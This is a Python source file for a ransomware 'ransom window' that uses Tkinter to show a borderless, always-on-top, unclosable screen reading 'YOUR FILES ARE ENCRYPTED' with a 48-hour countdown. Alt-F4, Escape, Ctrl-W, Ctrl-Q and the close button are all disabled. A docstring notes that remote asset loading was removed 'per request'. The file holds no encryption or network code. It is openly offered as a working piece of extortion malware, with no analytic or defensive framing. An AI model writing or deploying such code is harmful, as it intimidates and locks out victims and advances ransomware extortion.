"""
Ransom window display module (simplified).
Creates an unclosable, always-on-top compact window with a countdown timer
and a prominent text message. GIF/remote asset loading removed per request.
"""
import tkinter as tk
from tkinter import Label
import threading
import time
import sys
import os


# Global close signal shared between threads
_close_signal = threading.Event()


class RansomWindow:
    def __init__(self, hours=48):
        self.root = tk.Tk()
        self.hours_remaining = hours
        self.seconds_remaining = hours * 3600
        self.setup_window()
        
    def setup_window(self):
        """Configure the window to be unclosable and compact."""
        # Compact window size for timer + message
        window_width = 520
        window_height = 220
        # Center on screen
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.root.resizable(False, False)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)  # Remove window decorations
        
        # Disable close methods
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.root.bind('<Alt-F4>', lambda e: "break")
        self.root.bind('<Escape>', lambda e: "break")
        self.root.bind('<Control-w>', lambda e: "break")
        self.root.bind('<Control-q>', lambda e: "break")
        
        # Set background color
        self.root.configure(bg='#000000')
        
        # Create main container
        container = tk.Frame(self.root, bg='#000000')
        container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Title with timer (compact)
        self.title_label = Label(
            container,
            text="⏰ 48:00:00 ⏰",
            font=('Courier New', 16, 'bold'),
            bg='#000000',
            fg='#ff0000',
            pady=5
        )
        self.title_label.pack()
        
        # Message text (no images/GIFs)
        self.message_label = Label(
            container,
            text="YOUR FILES ARE ENCRYPTED",
            font=('Courier New', 16, 'bold'),
            bg='#000000',
            fg='#ff0000',
            pady=8
        )
        self.message_label.pack()

        self.note_label = Label(
            container,
            text=(
                "A unique key is required to restore them.\n"
                "Do not turn off your computer."
            ),
            font=('Courier New', 10),
            bg='#000000',
            fg='#ff5555'
        )
        self.note_label.pack()
        
        # Start countdown timer
        self.update_timer()
    
    def update_timer(self):
        """Update countdown timer every second."""
        # Allow external thread to request a clean shutdown
        if _close_signal.is_set():
            try:
                self.root.destroy()
            except Exception:
                pass
            return
        if self.seconds_remaining > 0:
            self.seconds_remaining -= 1
            
            hours = self.seconds_remaining // 3600
            minutes = (self.seconds_remaining % 3600) // 60
            seconds = self.seconds_remaining % 60
            
            # Compact timer format
            timer_text = f"⏰ {hours:02d}:{minutes:02d}:{seconds:02d} ⏰"
            self.title_label.config(text=timer_text)
            
            # Continue updating
            self.root.after(1000, self.update_timer)
        else:
            self.title_label.config(
                text="⏰ EXPIRED ⏰",
                fg='#ff0000'
            )
    
    def disable_close(self):
        """Prevent window from being closed."""
        return "break"
    
    def show(self):
        """Display the window and enter main loop."""
        self.root.mainloop()
    
    def destroy(self):
        """Force close the window (for testing/debugging only)."""
        self.root.destroy()


def show_ransom_window(hours=48, blocking=True):
    """
    Show the ransom window.
    
    Args:
        hours: Countdown time in hours (default 48)
        blocking: If True, blocks until window is closed. If False, runs in thread.
    """
    # Reset any previous close request when showing a new window
    try:
        _close_signal.clear()
    except Exception:
        pass

    if blocking:
        window = RansomWindow(hours)
        window.show()
    else:
        def run_window():
            window = RansomWindow(hours)
            window.show()
        
        thread = threading.Thread(target=run_window, daemon=False)
        thread.start()
        return thread


def close_ransom_window():
    """Signal the running ransom window (if any) to close.

    The window checks this flag once per second on its timer loop and will
    destroy itself cleanly from the Tk thread.
    """
    try:
        _close_signal.set()
    except Exception:
        pass


if __name__ == "__main__":
    # Test the ransom window
    print("[ransom_window] Starting ransom window display...")
    show_ransom_window(hours=48, blocking=True)
